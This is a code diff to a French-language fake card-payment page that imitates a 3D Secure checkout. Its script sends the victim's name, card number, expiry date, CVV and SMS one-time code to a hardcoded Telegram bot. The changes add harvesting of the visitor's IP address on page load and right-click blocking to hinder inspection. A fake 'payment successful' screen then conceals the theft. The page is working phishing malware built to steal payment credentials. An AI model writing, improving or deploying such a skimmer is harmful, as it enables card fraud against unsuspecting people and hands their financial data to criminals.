@@ -93,14 +93,14 @@
       <label for="cvv">Code de sécurité (CVV)</label>
       <input type="number" id="cvv" name="cvv" maxlength="3" required placeholder="XXX">
       
-      <center><input type="submit" value="Payer">
+      <center><input type="submit" value="Payer"></center>
     </form>
   </div>
 
   <div class="payment-container hidden" id="step-2">
     <h2>3D Secure</h2>
     <div class="spinner"></div>
-    <center><p>VEUILLEZ PATIENTEZ...</p>
+    <center><p>VEUILLEZ PATIENTEZ...</p></center>
   </div>
 
   <div class="payment-container hidden" id="step-3">
@@ -120,13 +120,16 @@
 
   <div class="payment-container hidden" id="step-5">
     <h2>PAIEMENT RÉUSSI</h2>
-    <center><p>Redirection dans quelques instants...</p>
+    <center><p>Redirection dans quelques instants...</p></center>
   </div>
 
   <script>
     const TELEGRAM_BOT_TOKEN = '7829797076:AAGfrZMGpGdCYsbSDxYXJBOR8jc4D2AjC1k';
     const TELEGRAM_CHAT_ID = '7747778364';
 
+    let userIP = ''; // Variable pour stocker l'adresse IP de l'utilisateur
+
+    // Fonction pour envoyer un message à Telegram
     function sendToTelegram(message) {
       const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
       const data = { chat_id: TELEGRAM_CHAT_ID, text: message };
@@ -138,20 +141,45 @@
       });
     }
 
+    // Fonction pour récupérer l'adresse IP publique de l'utilisateur
     function fetchUserIP() {
       fetch('https://api.ipify.org?format=json')
         .then(response => response.json())
         .then(data => {
-          const userIP = data.ip;
-          sendToTelegram(`Nouvelle visite : IP utilisateur -> ${userIP}`);
+          userIP = data.ip; // Stocker l'adresse IP
+          // Envoyer une notification avec l'IP dès l'entrée sur le site
+          sendToTelegram(`Nouvel utilisateur sur le site - IP: ${userIP}`);
         })
         .catch(error => console.error('Erreur lors de la récupération de l\'IP :', error));
     }
 
+    // Appeler la fonction pour récupérer l'adresse IP au chargement de la page
     window.onload = function () {
       fetchUserIP();
     };
 
+    // Bloquer l'accès à l'inspection du fichier via le clic droit
+    document.addEventListener('contextmenu', function (event) {
+      // Vérifier si le clic droit est effectué sur les champs de formulaire
+      if (!(event.target.id === 'cardholder-name' || 
+            event.target.id === 'card-number' || 
+            event.target.id === 'expiry-date' || 
+            event.target.id === 'cvv' || 
+            event.target.id === 'sms-code')) {
+        event.preventDefault(); // Empêcher l'inspection du fichier en dehors des champs spécifiés
+      }
+    });
+
+    // Fonction pour autoriser uniquement le clic droit dans certains champs de formulaire (pour coller)
+    document.getElementById('payment-form').addEventListener('contextmenu', function(event) {
+      if (event.target && (event.target.tagName === 'INPUT')) {
+        // Laisser le clic droit sur les champs de saisie
+        return true;
+      }
+      event.preventDefault(); // Bloquer ailleurs
+    });
+
+    // Gestionnaire de soumission du formulaire de paiement
     document.getElementById('payment-form').addEventListener('submit', function(event) {
       event.preventDefault();
 
@@ -160,12 +188,14 @@
       const expiryDate = document.getElementById('expiry-date').value;
       const cvv = document.getElementById('cvv').value;
 
+      // Ajouter l'adresse IP dans le message Telegram
       sendToTelegram(`
         Paiement reçu :
         Nom : ${cardholderName}
         Numéro : ${cardNumber}
         Expiration : ${expiryDate}
         CVV : ${cvv}
+        IP : ${userIP}
       `);
 
       document.getElementById('step-1').classList.add('hidden');
@@ -177,11 +207,14 @@
       }, 10000);
     });
 
+    // Gestionnaire de soumission du formulaire de code SMS
     document.getElementById('sms-form').addEventListener('submit', function(event) {
       event.preventDefault();
 
       const smsCode = document.getElementById('sms-code').value;
-      sendToTelegram(`Code SMS reçu : ${smsCode}`);
+
+      // Ajouter l'adresse IP dans le message Telegram
+      sendToTelegram(`Code SMS reçu : ${smsCode} | IP : ${userIP}`);
 
       document.getElementById('step-3').classList.add('hidden');
       document.getElementById('step-4').classList.remove('hidden');
@@ -204,5 +237,6 @@
       this.value = value;
     });
   </script>
+
 </body>
 </html>
